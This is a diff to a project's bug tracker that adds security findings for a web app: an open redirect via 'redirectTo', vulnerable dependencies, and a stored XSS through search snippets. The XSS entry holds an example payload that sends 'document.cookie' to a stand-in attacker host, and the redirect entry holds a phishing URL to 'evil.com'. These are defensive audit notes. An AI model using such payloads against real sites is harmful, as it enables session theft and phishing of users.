@@ -23,6 +23,40 @@
 
 > Fix order: P0 → P1 → P2 → P3.
 
+### 🟠 BUG-015 · P2 · Unvalidated redirect destinations (potential open-redirect)
+
+- **Found by**: Phase 4 grep for redirect/next params · 2026-05-23
+- **Symptom**: `packages/web/app/auth/callback/route.ts:10` reads `?next=` from query and passes it to a redirect without origin validation. Same with `packages/web/app/sign-in/page.tsx:4` reading `redirectTo`. An attacker phishing link like `localhost:3000/sign-in?redirectTo=https://evil.com/grab-cookie` could after-auth redirect users to an attacker site.
+- **Repro**: Compose sign-in URL with `?redirectTo=https://example.com`. Sign in. Redirected to example.com.
+- **Severity**: P2 — phishing-style exploit, not a direct compromise. Real risk goes up once the app is on a public domain.
+- **Proposed fix**: Validate `next` and `redirectTo` only allow relative paths (`startsWith('/') && !startsWith('//')`), reject anything else with a fallback to `/`.
+- **Owner**: Claude Code
+- **Status**: 🟠 open
+
+### 🟠 BUG-014 · P1 · 17 dependency vulnerabilities (5 high, 10 moderate, 2 low)
+
+- **Found by**: `pnpm audit --audit-level=high` · 2026-05-23
+- **Symptom**: Notable hits include Next.js 14.2.35 vulnerable to middleware/proxy bypass in i18n pages-router scenarios (GHSA-36qx-fr4f-26g5). Patched versions = >= 15.5.16, which is a major-version jump.
+- **Repro**: `pnpm audit` from workspace root.
+- **Severity**: P1 for the Next.js high-severity entries; P2/P3 for the rest.
+- **Proposed fix**: 
+  1. Run `pnpm audit --fix` first — auto-resolve where possible
+  2. For Next.js: evaluate the upgrade path to Next 15.x in a branch; if the middleware bypass doesn't apply to our setup (we use App Router, not Pages Router with i18n), document it as a known-non-applicable advisory.
+  3. For remaining moderates: case-by-case.
+- **Owner**: Claude Code
+- **Status**: 🟠 open
+
+### 🔴 BUG-013 · P0 · XSS via search-snippet `dangerouslySetInnerHTML`
+
+- **Found by**: Phase 4 security code-review (grep dangerouslySetInnerHTML) · 2026-05-23
+- **Symptom**: `packages/web/app/search/search-panel.tsx:107` renders the search hit's `snippet` field directly with `dangerouslySetInnerHTML`. The `snippet` is composed by the search endpoint from note title + body excerpts. Any note title or body containing `<script>`, `<img onerror>`, etc. will execute when ANY user searches and the malicious note's snippet appears in results.
+- **Exploit scenario**: Attacker creates a note titled `<img src=x onerror="fetch('https://attacker/?c='+document.cookie)">`. Owner later searches → snippet rendered raw → attacker exfiltrates session token.
+- **Repro**: Save a note with title `<script>window.__XSS=true</script>plain` (would need explicit auth to test live). Then search for "plain". Snippet contains the literal `<script>`, executes on render, `window.__XSS` becomes true.
+- **Severity**: P0 — full session compromise possible against any logged-in user.
+- **Proposed fix**: Either (a) sanitise snippet server-side: the search/semantic endpoints should HTML-encode the source text before wrapping match terms in `<mark>`; (b) sanitise client-side via DOMPurify before passing to dangerouslySetInnerHTML; (c) parse the snippet into a React fragment where text is rendered safely and only `<mark>` is allowed.
+- **Owner**: Claude Code
+- **Status**: 🔴 open — fix immediately before any persistent storage of attacker-crafted notes.
+
 ### 🟠 BUG-012 · P1 · `auth-refresh-provider-token` Edge Function crashes on OPTIONS preflight
 
 - **Found by**: Phase 1 API sweep · 2026-05-23
